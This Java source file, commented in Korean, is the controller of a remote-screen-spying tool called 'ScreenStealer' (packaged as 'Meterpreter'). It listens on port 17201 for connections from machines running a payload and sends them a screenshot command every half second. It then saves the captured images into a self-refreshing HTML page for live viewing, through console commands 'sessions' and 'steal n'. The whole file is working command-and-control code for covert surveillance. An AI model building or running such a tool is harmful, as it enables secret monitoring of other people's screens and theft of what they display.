package com.meterpreter;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.ObjectInputStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;

/**
 * Meterpreter 프로젝트 내부에서 사용될 설정변수 등 공유자원
 * @author root
 *
 */
abstract class pRes {

	public static final String IMG_NAME = "live.jpg";
	public static final String HTML_NAME = "live.html";
	public static final int INTERVAL = 500;

	public static List<Session> sessionList;

	public static ServerSocket serverSocket;
	public static final int LISTEN_PORT = 17201;
}

/**
 * 소켓 통신간 규약
 * @author root
 *
 */
abstract class Cmd {

	public static final String TAKE_SCREEN_SHOT = "TSS";
}

/**
 * 연결된 세션에 TAKE_SCREEN_SHOT 명령을 보내 해당 세션의 이미지를 받아온다
 * 받아온 이미지는 pRes.IMG_NAME의 이름으로 로컬 디렉토리에 저장된다
 * 최초 할당 시 html 파일이 생성되며 해당파일을 브라우저에서 열면
 * 이미지 파일을 일정 주기로 새로고침해주어 마치 라이브로 연결된 세션의 모습을 보는듯 하게 해준다
 * @author root
 *
 */
class Commander {

	private BufferedReader br;
	private Thread commandThread;

	private static class Singleton {
		static Commander INSTANCE = new Commander();
	}

	public static Commander getInstance() {
		return Singleton.INSTANCE;
	}

	public Commander() {
		br = new BufferedReader(new InputStreamReader(System.in));
		try {
			File img = new File(pRes.IMG_NAME);
			if(!img.exists())
				img.createNewFile();
			
			File file = new File(pRes.HTML_NAME);
			if(!file.exists())
				file.createNewFile();
			FileOutputStream fos = new FileOutputStream(pRes.HTML_NAME);
			String html = 
					"<!DOCTYPE html>\n" + 
					"<html>\n" + 
					"<head>\n" + 
					"	<meta http-equiv=\"refresh\" content=\"0.5\">\n" + 
					"	<title>	Live view</title>\n" + 
					"</head>\n" + 
					"<body>\n" + 
					"<img src=\"file://" + 
					img.getAbsolutePath() + 
					"\">" +
					"</body>\n" + 
					"</html>\n" + 
					"";
			fos.write(html.getBytes());
			fos.close();
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	/**
	 * 연결된 세션에게 커맨드를 전송한다
	 * 페이로드를 싱행중인 세션은 커맨드 수신시 자신의 화면을 캡쳐한 데이터를 송신하게 되며
	 * Meterpreter에서의 수신은 Receiver클래스가 그 역할을 한다
	 * 
	 * @param dos
	 * Meterpreter 작동방식이 연결된 세션중 한 세션을 선택해
	 * 그 세션으로부터 지속적인 이미지를 수신하는 방식이기에
	 * 해당 세션에 대한 DataOutputStream을 인자로 받아 해당 세션과만의 통신을 보장한다
	 */
	public void command(DataOutputStream dos) {

		System.out.println("Press 'e' to interrupt stealing.\n");
		commandThread = new Thread(() -> {
			while (true) {
				try {
					dos.writeUTF(Cmd.TAKE_SCREEN_SHOT);
					Thread.sleep(pRes.INTERVAL);
				} catch (Exception e) {
					System.out.println("Stealing was interrupted.");
					System.out.print("\nscreenstealer > ");
					break;
				}
			}
		});
		commandThread.start();
		
		while (true) {
			try {
				String input = br.readLine();
				if (input.equals("e"))
					break;

				System.out.println("\nPress 'e' to end stealing.");
			} catch (Exception e) {
				e.printStackTrace();
				break;
			}
		}
		commandThread.interrupt();
	}
}

/**
 * Commander에서 세션에게 커맨드를 보낸다면 해당 세션은 이미지를 Meterpreter에게 송신하게 되고
 * 해당 이미지는 Receiver 클래스에서 수신하고 저장하게 된다
 * 세션 최초 연결 시 각 세션에는 각 1개의 Receiver가 초기화되서 돌아가게 된다
 * @author root
 *
 */
class Receiver {

	private ObjectInputStream ois;

	public Receiver(ObjectInputStream ois) {
		this.ois = ois;
	}

	public void update() throws Exception {
		byte[] capturedImage = getScreenCaptureByteArray();
		if (capturedImage == null)
			throw new Exception("Session closed");

		FileOutputStream fos = new FileOutputStream(pRes.IMG_NAME);
		fos.write(capturedImage);
		fos.close();

		return;
	}

	private byte[] getScreenCaptureByteArray() {
		try {
			return (byte[]) ois.readObject();
		} catch (Exception e) {
			return null;
		}
	}
}

/**
 * Payload 실행 시 Meterpreter에 연결된 세션을 관리하는 클래스이다
 * 커맨드 전송을 위한 OutputStream과 이미지 수신을 위한 InputStream을 지니고 있고
 * 해당 객체에 대한 getter, setter을 가지고 있어
 * 접속된 여러개의 세션 중 원하는 세션을 골라 해당 세션에게 커맨드를 전송할 수 있게 해준다
 * 세션은 pRes.sessionList에서 공유자원으로서 관리된다
 * 
 * 모든 세션이 초기화 됨과 동시에 한개의 스레드에 할당되고
 * 하나의 Receiver가 동작해 각 세션마다 커맨드 송신으로부터 오는 이미지의 수신을 대기하게 된다
 * @author root
 *
 */
class Session implements Runnable {

	private String ip;
	private DataOutputStream dos;
	private ObjectInputStream ois;

	public Session(Socket sessionSocket) {
		if (!getStream(sessionSocket))
			return;
	}

	private boolean getStream(Socket sessionSocket) {
		try {
			dos = new DataOutputStream(sessionSocket.getOutputStream());
			ois = new ObjectInputStream(sessionSocket.getInputStream());
			ip = sessionSocket.getInetAddress().getHostAddress();
			System.out.println("\nNew Session connected : " + ip);
			System.out.print("\nscreenstealer > ");

			synchronized (pRes.sessionList) {
				pRes.sessionList.add(this);
			}
			return true;
		} catch (Exception e) {
			System.out.println("Failed to get stream.");
			return false;
		}
	}

	@Override
	public void run() {
		Receiver receiver = new Receiver(ois);

		while (true) {
			try {
				receiver.update();
			} catch (Exception sessionClosed) {
				System.out.println("Session lost : " + ip);
				System.out.print("\nscreenstealer > ");

				synchronized (pRes.sessionList) {
					pRes.sessionList.remove(this);
				}
				return;
			}
		}
	}

	public String getIp() {
		return ip;
	}

	public DataOutputStream getDos() {
		return dos;
	}
}

/**
 * 사용자 인터페이스를 위한 IO 클래스
 * 사용할 수 있는 명령어는 다음과 같다
 * 1. sessions : 현재 연결중인 세션을 확인한다. 접속중인 세션이 없을 시 표시되지 않는다.
 * 2. steal n : 현재 연결중인 세션에게 커맨드를 보내 세션의 화면을 모니터링하기 시작한다. e로 중지할 수 있다
 * 3. exit, quit : 프로그램을 종료한다
 * @author root
 *
 */
class IO {

	private BufferedReader br;

	public IO() {
		br = new BufferedReader(new InputStreamReader(System.in));
	}

	public void mainIO() {
		String logo =""
				+ "  ____                           ____  _             _           \n" + 
				" / ___|  ___ _ __ ___  ___ _ __ / ___|| |_ ___  __ _| | ___ _ __ \n" + 
				" \\___ \\ / __| '__/ _ \\/ _ \\ '_ \\\\___ \\| __/ _ \\/ _` | |/ _ \\ '__|\n" + 
				"  ___) | (__| | |  __/  __/ | | |___) | ||  __/ (_| | |  __/ |   \n" + 
				" |____/ \\___|_|  \\___|\\___|_| |_|____/ \\__\\___|\\__,_|_|\\___|_|   \n" + 
				"  ____          ___                                              \n" + 
				" | __ ) _   _  |_ _|_ __  ______ _ _ __  _ __                    \n" + 
				" |  _ \\| | | |  | || '_ \\|_  / _` | '_ \\| '_ \\                   \n" + 
				" | |_) | |_| |  | || | | |/ / (_| | |_) | |_) |                  \n" + 
				" |____/ \\__, | |___|_| |_/___\\__,_| .__/| .__/                   \n" + 
				"        |___/                     |_|   |_|                      ";
		
		System.out.println(logo);

		String cmd = null;
		while (true) {
			System.out.print("\nscreenstealer > ");
			try {
				cmd = br.readLine();
			} catch (Exception e) {
				e.printStackTrace();
			}

			String[] isolated = cmd.split(" ");

			int sessionIdx = -1;
			if (isolated.length == 1) {
				switch (isolated[0]) {
				case "sessions":
					if (pRes.sessionList.size() == 0) {
						System.out.println("No session was connedted.");
						break;
					}
					System.out.println();
					System.out.println("No          IP");
					System.out.println("-----------------------");
					for (int i = 0; i < pRes.sessionList.size(); ++i)
						System.out.println(i + 1 + "        " + pRes.sessionList.get(i).getIp());
					break;

				case "exit":
				case "quit":
					System.exit(0);

				default:
					invalidCommand();
					break;
				}
			} else if (isolated.length == 2 && isolated[0].equals("steal")) {
				try {
					sessionIdx = Integer.parseInt(isolated[1]);
				} catch (Exception e) {
					invalidCommand();
					continue;
				}
				if (pRes.sessionList.size() < sessionIdx || sessionIdx <= 0) {
					System.out.println("There is no session " + sessionIdx);
					continue;
				}
				Session session = pRes.sessionList.get(sessionIdx - 1);
				Commander.getInstance().command(session.getDos());
			} else
				invalidCommand();

		}
	}

	private void invalidCommand() {
		System.out.println("Invalid command.");
		System.out.println("Use 'sessions' or 'steal n', n = session number.");
	}
}

/**
 * 엔트리 클래스, Meterpreter의 초기화 가능여부를 판단해 실행가능상태인 경우만 실행한다
 * @author root
 *
 */
public class Meterpreter {

	public static void main(String[] args) {
		Meterpreter meterpreter = new Meterpreter();
		meterpreter.activate();
	}

	public void activate() {
		if (!initServer())
			return;

		acceptClient();
		new IO().mainIO();
	}

	private boolean initServer() {
		try {
			pRes.serverSocket = new ServerSocket(pRes.LISTEN_PORT);
			pRes.sessionList = Collections.synchronizedList(new ArrayList<>());
			return true;
		} catch (IOException e) {
			System.out.println("Port " + pRes.LISTEN_PORT + " is already used.");
			return false;
		}
	}

	private void acceptClient() {
		new Thread(() -> {
			while (true) {
				try {
					Socket sessionSocket = pRes.serverSocket.accept();
					new Thread(new Session(sessionSocket)).start();
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		}).start();
	}
}